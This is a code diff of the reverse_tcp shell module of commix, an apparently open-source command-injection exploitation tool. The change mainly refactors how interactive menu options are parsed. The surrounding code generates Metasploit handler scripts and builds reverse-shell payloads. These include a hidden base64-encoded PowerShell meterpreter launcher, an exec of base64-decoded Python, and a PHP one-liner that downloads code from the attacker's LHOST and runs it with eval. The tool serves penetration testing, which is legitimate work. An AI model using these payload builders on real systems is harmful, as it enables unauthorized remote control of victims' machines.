@@ -24,6 +24,29 @@ from src.utils import settings
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 """
+Check for available shell options.
+"""
+def shell_options(option):
+  if option.lower() == "reverse_tcp":
+    warn_msg = "You are already into the '" + option.lower() + "' mode."
+    print settings.print_warning_msg(warn_msg)
+  elif option.lower() == "?": 
+    menu.reverse_tcp_options()
+  elif option.lower() == "quit": 
+    sys.exit(0)
+  elif option[0:3].lower() == "set":
+    if option[4:9].lower() == "lhost":
+      check_lhost(option[10:])
+    if option[4:9].lower() == "rhost":
+      err_msg =  "The '" + option[4:9].upper() + "' option, is not "
+      err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
+      print settings.print_error_msg(err_msg)  
+    if option[4:9].lower() == "lport":
+      check_lport(option[10:])
+  else:
+    return option
+
+"""
 Success msg.
 """
 def shell_success():
@@ -169,20 +192,11 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
     elif nc_version == '3':
       nc_alternative = NETCAT_ALTERNATIVES[2]
       break
-    elif nc_version.lower() == "reverse_tcp": 
-      warn_msg = "You are already into the '" + nc_version.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
-      continue
-    elif nc_version.lower() == "?": 
-      menu.os_shell_options()
-      continue    
-    elif nc_version.lower() in settings.SHELL_OPTIONS:
-      return nc_version
-    elif nc_version[0:3].lower() == "set":
-      if nc_version[4:9].lower() == "lhost":
-        check_lhost(nc_version[10:])
-      if nc_version[4:9].lower() == "lport":
-        check_lport(nc_version[10:])
+    # Check for available shell options  
+    elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
+      if shell_options(nc_version):
+        return shell_options(nc_version)
+    # Invalid option    
     else:
       err_msg = "The '" + nc_version + "' option, is not valid."  
       print settings.print_error_msg(err_msg)
@@ -282,8 +296,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
         with open(output, 'w+') as filewrite:
           filewrite.write("use exploit/multi/handler\n"
                           "set payload " + payload + "\n"
-                          "set lhost "+ str(settings.LHOST) + "\n"
-                          "set lport "+ str(settings.LPORT) + "\n"
+                          "set lhost " + str(settings.LHOST) + "\n"
+                          "set lport " + str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
         if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
@@ -327,8 +341,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
         with open(output, 'w+') as filewrite:
           filewrite.write("use exploit/multi/handler\n"
                           "set payload " + payload + "\n"
-                          "set lhost "+ str(settings.LHOST) + "\n"
-                          "set lport "+ str(settings.LPORT) + "\n"
+                          "set lhost " + str(settings.LHOST) + "\n"
+                          "set lport " + str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
         if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
@@ -354,14 +368,24 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
 
 commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
+          if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS): 
+            if shell_options(windows_reverse_shell):
+              return shell_options(windows_reverse_shell)
+          elif windows_reverse_shell == '1' :
+            output = "powershell_attack.rc"
+          elif windows_reverse_shell == '2' :
+            output = "powershell_attack.txt"
+          else:
+            err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
+            print settings.print_error_msg(err_msg)
+            continue
+
           if not os.path.exists(settings.METASPLOIT_PATH):
             error_msg = settings.METASPLOIT_ERROR_MSG
             print settings.print_error_msg(error_msg)
             continue
-            
-          payload = "windows/meterpreter/reverse_tcp"
-          output = "powershell_attack.rc"
 
+          payload = "windows/meterpreter/reverse_tcp"
           # define standard metasploit payload
           info_msg = "Generating the '" + payload + "' shellcode... "
           sys.stdout.write(settings.print_info_msg(info_msg))
@@ -380,20 +404,19 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
               # Remove the ouput file.
-              os.remove(output)
+              #os.remove(output)
               with open(output, 'w+') as filewrite:
                 filewrite.write("use exploit/multi/handler\n"
                                 "set payload " + payload + "\n"
-                                "set lhost "+ str(settings.LHOST) + "\n"
-                                "set lport "+ str(settings.LPORT) + "\n"
+                                "set lhost " + str(settings.LHOST) + "\n"
+                                "set lport " + str(settings.LPORT) + "\n"
                                 "exploit\n\n")
               msf_launch_msg(output)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
 
-          if windows_reverse_shell == '2':
-            output = "powershell_attack.txt"
+          elif windows_reverse_shell == '2':
             unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
             os.chdir(unicorn_path)
             try:
@@ -401,16 +424,15 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               with open(output, 'r') as content_file:
                 other_shell = content_file.read().replace('\n', '')
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
-
+              # Remove the ouput file
+              os.remove(output)
               with open("unicorn.rc", 'w+') as filewrite:
                 filewrite.write("use exploit/multi/handler\n"
                                 "set payload " + payload + "\n"
-                                "set lhost "+ str(settings.LHOST) + "\n"
-                                "set lport "+ str(settings.LPORT) + "\n"
+                                "set lhost " + str(settings.LHOST) + "\n"
+                                "set lport " + str(settings.LPORT) + "\n"
                                 "exploit\n\n")
               msf_launch_msg("unicorn.rc")
-              # Remove the ouput file.
-              os.remove(output)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
@@ -426,19 +448,26 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
 
 commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
 
-        if not os.path.exists(settings.METASPLOIT_PATH):
-          error_msg = settings.METASPLOIT_ERROR_MSG
-          print settings.print_error_msg(error_msg)
-          continue
-          
-        output = "web_delivery.rc"
-        if web_delivery == '1':
+        if any(option in  web_delivery.lower() for option in settings.SHELL_OPTIONS):  
+          if shell_options(web_delivery):
+            return shell_options(web_delivery)
+        elif web_delivery == '1':
           payload = "python/meterpreter/reverse_tcp"
         elif web_delivery == '2':
           payload = "php/meterpreter/reverse_tcp"
         elif web_delivery == '3':
           payload = "windows/meterpreter/reverse_tcp"
+        else:
+          err_msg = "The '" + web_delivery + "' option, is not valid."  
+          print settings.print_error_msg(err_msg)
+          continue
 
+        if not os.path.exists(settings.METASPLOIT_PATH):
+          error_msg = settings.METASPLOIT_ERROR_MSG
+          print settings.print_error_msg(error_msg)
+          continue
+
+        output = "web_delivery.rc"
         with open(output, 'w+') as filewrite:
           filewrite.write("use exploit/multi/script/web_delivery\n"
                           "set target " + str(int(web_delivery)-1) + "\n"
@@ -458,7 +487,6 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
             other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
           msf_launch_msg(output)
           break
-
         elif web_delivery == '2':
           if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
             set_php_working_dir()
@@ -467,7 +495,6 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
             other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));\""
           msf_launch_msg(output)
           break
-
         elif web_delivery == '3':
           if not settings.TARGET_OS == "win":
             windows_only_attack_vector()
@@ -477,20 +504,11 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
             msf_launch_msg(output)
             break
       break
-
-    elif other_shell.lower() == "reverse_tcp":
-      warn_msg = "You are already into the '" + other_shell.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
-      continue
-    elif other_shell.lower() in settings.SHELL_OPTIONS:
-      return other_shell
-    elif other_shell[0:3].lower() == "set":
-      if other_shell[4:9].lower() == "lhost":
-        check_lhost(other_shell[10:])
-      if other_shell[4:9].lower() == "lport":
-        check_lport(other_shell[10:])
-    elif other_shell.lower() == "quit": 
-      sys.exit(0)
+    # Check for available shell options  
+    elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
+      if shell_options(other_shell):
+        return shell_options(other_shell)
+    # Invalid option
     else:
       err_msg = "The '" + other_shell + "' option, is not valid."  
       print settings.print_error_msg(err_msg)
@@ -532,25 +550,13 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """
       if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         shell_success()
         break
-      elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
-        print reverse_tcp_option
-        return reverse_tcp_option
-      else:
-        pass 
-    elif reverse_tcp_option.lower() == "?": 
-      menu.os_shell_options()
-      continue
-    elif reverse_tcp_option.lower() == "quit": 
-      sys.exit(0)
-    elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
-      return reverse_tcp_option
-    elif reverse_tcp_option[0:3].lower() == "set":
-      if reverse_tcp_option[4:9].lower() == "lhost":
-        check_lhost(reverse_tcp_option[10:])
-      if reverse_tcp_option[4:9].lower() == "lport":
-        check_lport(reverse_tcp_option[10:])
+    # Check for available shell options    
+    elif any(option in reverse_tcp_option.lower() for option in settings.SHELL_OPTIONS):
+      if shell_options(reverse_tcp_option):
+        return shell_options(reverse_tcp_option)
+    # Invalid option    
     else:
-      err_msg = "The '" + reverse_tcp_option + "' option, is not valid."
+      err_msg = "The '" + reverse_tcp_option + "' option, is not valid."  
       print settings.print_error_msg(err_msg)
       continue
 
@@ -567,11 +573,18 @@ def configure_reverse_tcp():
       warn_msg = "You are already into the '" + option.lower() + "' mode."
       print settings.print_warning_msg(warn_msg)
       continue
-    elif option.lower() == "?": 
+    if option.lower() == "?": 
       menu.reverse_tcp_options()
       continue
-    elif option.lower() == "quit": 
+    if option.lower() == "quit": 
       sys.exit(0)
+    elif option.lower() == "os_shell" or option.lower() == "back": 
+      settings.REVERSE_TCP = False   
+      break 
+    elif option.lower() == "bind_tcp":
+      settings.BIND_TCP = True
+      settings.REVERSE_TCP = False
+      break 
     elif len(settings.LPORT) != 0 and len(settings.LHOST) != 0:
       break 
     elif option[0:3].lower() == "set":
@@ -596,13 +609,6 @@ def configure_reverse_tcp():
               break
           else:
             continue
-    elif option.lower() == "os_shell" or option.lower() == "back": 
-      settings.REVERSE_TCP = False   
-      break 
-    elif option.lower() == "bind_tcp":
-      settings.BIND_TCP = True
-      settings.REVERSE_TCP = False
-      break 
     else:
       err_msg = "The '" + option + "' option, is not valid."
       print settings.print_error_msg(err_msg)
